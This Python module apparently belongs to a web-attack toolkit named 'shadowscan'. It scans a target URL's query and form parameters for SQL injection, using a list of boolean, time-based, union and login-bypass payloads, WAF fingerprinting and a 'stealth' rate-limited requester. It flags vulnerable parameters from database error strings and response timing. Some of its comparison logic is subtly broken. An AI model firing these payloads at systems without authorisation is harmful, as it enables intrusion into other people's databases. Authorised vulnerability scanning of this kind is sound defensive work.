# shadowscan/modules/web/sql_injection.py
import requests
import re
from typing import Dict, Any, List, Optional
from ..base import BaseModule
from ...core.logger import StealthLogger
from ...utils.request_helper import safe_request, is_vulnerable_to_sqli
from ...utils.stealth import StealthRequester

SQLI_PAYLOADS = [
    # Boolean-based
    "' AND 1=1-- ",
    "' AND 1=2-- ",
    # Time-based
    "' AND SLEEP(5)-- ",
    # Error-based
    "' AND 1=CONVERT(int, (SELECT @@version))-- ",
    # Union-based
    "' UNION SELECT NULL-- ",
    # Special characters
    "1'\"",
    # Advanced payloads
    "' OR ''='",
    "' OR 'x'='x",
    "' OR 1=1-- ",
    "admin'--",
    "admin' #",
    "admin')--",
    "' OR '1'='1'--",
    "' OR '1'='1'/*",
    "a' OR '1'='1'--",
    "' ORDER BY 1-- ",
    "' ORDER BY 2-- ",
    "' ORDER BY 3-- ",
    # MS SQL specific
    "' WAITFOR DELAY '0:0:5'-- ",
    # MySQL specific
    "' SLEEP(5)-- ",
    # PostgreSQL specific
    "' pg_sleep(5)-- ",
    # Oracle specific
    "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1-- "
]

ERROR_MESSAGES = [
    # MySQL
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark after the character string",
    # PostgreSQL
    "pg_query()",
    "pg_exec()",
    "pg_query",
    # Microsoft SQL Server
    "unclosed quotation mark after the character string",
    "incorrect syntax near",
    "expecting CONCURRENCY or READCOMMITTED_LOCK",
    # Oracle
    "ora-01756",
    "ora-00933",
    "ora-06512",
    # Generic
    "sql syntax",
    "syntax error",
    "query failed",
    "database error",
    "mysql_fetch",
    "mysqli_fetch",
    "mysql error",
    "near \\S+ syntax",
    "exception.*sql",
    "sqlite3",
    "odbc",
    "jdbc",
    "unexpected end of command",
    "fatal error",
    "syntax error, unexpected"
]

class SQLInjectionScanner(BaseModule):
    """Modul profesional untuk mendeteksi SQL Injection"""
    
    def __init__(self, config: Dict[str, Any], logger: StealthLogger):
        super().__init__(config, logger)
        self.target_url = config['TARGET_URL']
        self.stealth_requester = StealthRequester(
            rate_limit=config['RATE_LIMIT_DELAY'],
            timeout=config['TIMEOUT'],
            stealth_mode=config['STEALTH_MODE']
        )
        self.vulnerabilities = []
    
    def scan(self) -> List[Dict[str, Any]]:
        """Jalankan scan SQL Injection profesional"""
        self.logger.info("🔍 Memulai scan SQL Injection profesional...", force=True)
        self.logger.register_module("sql_injection")
        
        # Tahap 1: Identifikasi parameter
        self.logger.info("📡 Mengidentifikasi parameter yang bisa diserang...")
        parameters = self._identify_parameters()
        if not parameters:
            self.logger.info("❌ Tidak ditemukan parameter yang bisa diserang")
            return []
        
        self.logger.info(f"✅ Ditemukan {len(parameters)} parameter yang bisa diserang")
        
        # Tahap 2: Cek keberadaan WAF
        self.logger.info("🛡️ Mengecek keberadaan WAF/IPS...")
        waf_detected = self._detect_waf()
        if waf_detected:
            self.logger.warning(f"⚠️ WAF/IPS terdeteksi: {waf_detected}")
        else:
            self.logger.info("✅ Tidak ada WAF/IPS terdeteksi")
        
        # Tahap 3: Deteksi SQLi
        self.logger.info("💉 Memulai deteksi SQL Injection...")
        for param in parameters:
            self.logger.info(f"  → Menguji parameter: {param}")
            vulns = self._test_parameter_for_sqli(param)
            for vuln in vulns:
                self.vulnerabilities.append(vuln)
                self.logger.add_vulnerability(
                    vuln['type'],
                    vuln['description'],
                    vuln['severity']
                )
        
        self.logger.info(f"✅ Scan SQL Injection selesai. Total temuan: {len(self.vulnerabilities)}", force=True)
        return self.vulnerabilities
    
    def _identify_parameters(self) -> List[str]:
        """Identifikasi parameter yang bisa diserang"""
        parameters = set()
        
        # Cek URL
        if '?' in self.target_url:
            query_string = self.target_url.split('?')[1]
            for param in query_string.split('&'):
                if '=' in param:
                    parameters.add(param.split('=')[0])
        
        # Cek form
        try:
            response = self.stealth_requester.get(self.target_url)
            if response:
                # Cari form dengan regex
                forms = re.findall(r'<form[^>]*>(.*?)</form>', response.text, re.IGNORECASE | re.DOTALL)
                for form in forms:
                    inputs = re.findall(r'<input[^>]+name=["\']([^"\']+)["\']', form)
                    for input_name in inputs:
                        parameters.add(input_name)
        except Exception as e:
            self.logger.warning(f"Gagal identifikasi parameter dari form: {str(e)}")
        
        return list(parameters)
    
    def _detect_waf(self) -> Optional[str]:
        """Deteksi WAF/IPS dengan teknik canggih"""
        # Kirim payload yang pasti akan diblokir oleh WAF
        test_payload = "AND 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 FROM information_schema.tables-- "
        
        try:
            # Coba dengan GET
            test_url = f"{self.target_url}?test={test_payload}"
            response = self.stealth_requester.get(test_url)
            
            if not response:
                return "Unknown WAF"
            
            # Cek header respons
            if 'cloudflare' in response.headers.get('Server', '').lower():
                return "Cloudflare"
            if 'akamai' in response.headers.get('Server', '').lower():
                return "Akamai"
            if 'sucuri' in response.headers.get('Server', '').lower():
                return "Sucuri"
            
            # Cek kode status
            if response.status_code in [403, 429, 503]:
                return "Generic WAF"
            
            # Cek konten respons
            waf_signatures = {
                'cloudflare': ['cloudflare', 'cf-ray', 'cf-request-id'],
                'akamai': ['akamai', 'akam'], 
                'sucuri': ['sucuri', 'sucuri-firewall'],
                'barracuda': ['barra', 'barracuda'],
                'f5': ['asstm', 'bigip', 'f5'],
                'imperva': ['imperva', 'incapsula', 'citrix']
            }
            
            for waf_name, signatures in waf_signatures.items():
                for signature in signatures:
                    if signature in response.text.lower():
                        return waf_name.capitalize()
            
        except Exception as e:
            self.logger.warning(f"Gagal deteksi WAF: {str(e)}")
        
        return None
    
    def _test_parameter_for_sqli(self, param: str) -> List[Dict[str, Any]]:
        """Uji parameter untuk SQL Injection"""
        vulnerabilities = []
        
        # Cek dengan GET request
        for payload in SQLI_PAYLOADS:
            try:
                # Buat URL dengan payload
                if '?' in self.target_url:
                    test_url = self.target_url.replace(f"{param}=", f"{param}={payload}")
                else:
                    test_url = f"{self.target_url}?{param}={payload}"
                
                # Kirim request
                response = self.stealth_requester.get(test_url)
                if not response:
                    continue
                
                # Deteksi kerentanan
                if self._is_vulnerable(response, payload):
                    vuln_type = self._determine_vulnerability_type(response, payload)
                    description = self._generate_vulnerability_description(vuln_type)
                    
                    vulnerabilities.append({
                        'type': vuln_type,
                        'description': description,
                        'severity': 'high' if 'error' in vuln_type or 'time' in vuln_type else 'medium',
                        'parameter': param,
                        'payload': payload,
                        'url': test_url
                    })
                    break  # Hanya ambil satu kerentanan per parameter
                
            except Exception as e:
                self.logger.warning(f"Gagal menguji parameter {param} dengan payload {payload}: {str(e)}")
        
        return vulnerabilities
    
    def _is_vulnerable(self, response: requests.Response, payload: str) -> bool:
        """Deteksi apakah respons menunjukkan kerentanan SQLi"""
        # Cek error messages
        for error in ERROR_MESSAGES:
            if re.search(error, response.text, re.IGNORECASE):
                return True
        
        # Cek perbedaan respons antara payload true dan false
        if "' AND 1=1-- " in payload or "' AND 1=2-- " in payload:
            # Bandingkan dengan respons normal
            base_url = self.target_url.replace(payload, "")
            if '?' in base_url:
                base_url = base_url.split('?')[0] + '?' + '&'.join(base_url.split('?')[1].split('&')[1:])
            
            try:
                normal_response = self.stealth_requester.get(base_url)
                if normal_response and len(response.text) != len(normal_response.text):
                    return True
            except:
                pass
        
        # Cek time-based
        if "' AND SLEEP(5)-- " in payload or "WAITFOR DELAY" in payload:
            # Waktu respons lebih lama dari timeout normal
            if response.elapsed.total_seconds() > 4.5:
                return True
        
        return False
    
    def _determine_vulnerability_type(self, response: requests.Response, payload: str) -> str:
        """Tentukan jenis kerentanan SQLi"""
        if "' AND 1=1-- " in payload or "' AND 1=2-- " in payload:
            return "BOOLEAN_BASED_Sqli"
        if "' AND SLEEP(5)-- " in payload or "WAITFOR DELAY" in payload:
            return "TIME_BASED_Sqli"
        if any(error in payload for error in ["CONVERT(int", "ORA-"]):
            return "ERROR_BASED_Sqli"
        if "UNION SELECT" in payload:
            return "UNION_BASED_Sqli"
        
        # Cek dari respons
        for error in ERROR_MESSAGES:
            if re.search(error, response.text, re.IGNORECASE):
                return "ERROR_BASED_Sqli"
        
        if response.elapsed.total_seconds() > 4.5:
            return "TIME_BASED_Sqli"
        
        return "BOOLEAN_BASED_Sqli"
    
    def _generate_vulnerability_description(self, vuln_type: str) -> str:
        """Generate deskripsi kerentanan yang informatif"""
        descriptions = {
            "BOOLEAN_BASED_Sqli": "Parameter rentan terhadap Boolean-based SQL Injection",
            "TIME_BASED_Sqli": "Parameter rentan terhadap Time-based SQL Injection",
            "ERROR_BASED_Sqli": "Parameter rentan terhadap Error-based SQL Injection",
            "UNION_BASED_Sqli": "Parameter rentan terhadap Union-based SQL Injection"
        }
        return descriptions.get(vuln_type, "Parameter rentan terhadap SQL Injection")
